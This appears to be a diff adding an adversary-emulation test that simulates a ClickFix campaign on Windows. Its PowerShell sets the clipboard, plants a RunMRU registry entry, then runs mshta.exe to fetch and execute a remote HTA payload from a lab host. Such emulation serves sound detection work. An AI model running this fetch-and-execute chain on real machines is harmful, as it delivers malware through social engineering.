@@ -1,0 +1,64 @@
+- name: ClickFix Campaign - Full Attack Chain Simulation
+  auto_generated_guid: 3f3120f0-7e50-4be2-88ae-54c61230cb9f
+  description: |
+    Simulates a complete ClickFix-style campaign including:
+    1. Clipboard manipulation (copying malicious command)
+    2. RunMRU registry modification
+    3. Actual execution via mshta.exe
+    This technique relies on user interaction (Win+R + Enter) to trigger execution.
+    Used in social engineering campaigns that aim to bypass traditional startup methods.
+    Reference: https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection
+  supported_platforms:
+    - windows
+  input_arguments:
+    kali_ip:
+      description: IP address of the Kali Linux server hosting the HTA payload
+      type: string
+      default: 1.4
+    payload_url:
+      description: Full URL to the malicious HTA file
+      type: string
+      default: http://10.0.0.4/hello6.hta
+  executor:
+    command: |-
+      # Step 1: Simulate clipboard copy event (what the malicious site does)
+      $maliciousCommand = '"C:\Windows\System32\mshta.exe" #{payload_url}'
+      Write-Host "[*] Simulating clipboard copy event..."
+      Set-Clipboard -Value $maliciousCommand
+      Start-Sleep -Seconds 2
+      
+      # Step 2: Add entry to RunMRU (simulates user pressing Win+R and pasting)
+      Write-Host "[*] Adding RunMRU entry..."
+      $runMRUPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+      
+      # Create a unique MRU entry (typically uses letters a-z)
+      $timestamp = Get-Date -Format "yyyyMMddHHmmss"
+      $mruKey = "atomictest_$timestamp"
+      
+      Set-ItemProperty -Path $runMRUPath -Name $mruKey -Value $maliciousCommand
+      
+      # Update MRUList to include our new entry (Windows does this automatically)
+      $currentMRUList = (Get-ItemProperty -Path $runMRUPath -Name "MRUList" -ErrorAction SilentlyContinue).MRUList
+      if ($currentMRUList) {
+          Set-ItemProperty -Path $runMRUPath -Name "MRUList" -Value "$mruKey$currentMRUList"
+      }
+      
+      Write-Host "[*] RunMRU entry created: $mruKey"
+      Write-Host "[*] Command: $maliciousCommand"
+      
+      # Step 3: Optional - Actually execute the command (comment out if you just want telemetry)
+      Write-Host "[*] Executing payload (5 second delay)..."
+      Start-Sleep -Seconds 5
+      Invoke-Expression $maliciousCommand
+      
+    cleanup_command: |-
+      # Remove all atomictest entries
+      $runMRUPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+      $properties = Get-ItemProperty -Path $runMRUPath
+      $properties.PSObject.Properties | Where-Object { $_.Name -like "atomictest*" } | ForEach-Object {
+          Remove-ItemProperty -Path $runMRUPath -Name $_.Name -ErrorAction SilentlyContinue
+          Write-Host "[*] Removed: $($_.Name)"
+      }
+      Write-Host "[*] Cleanup complete"
+    name: powershell
+    elevation_required: false
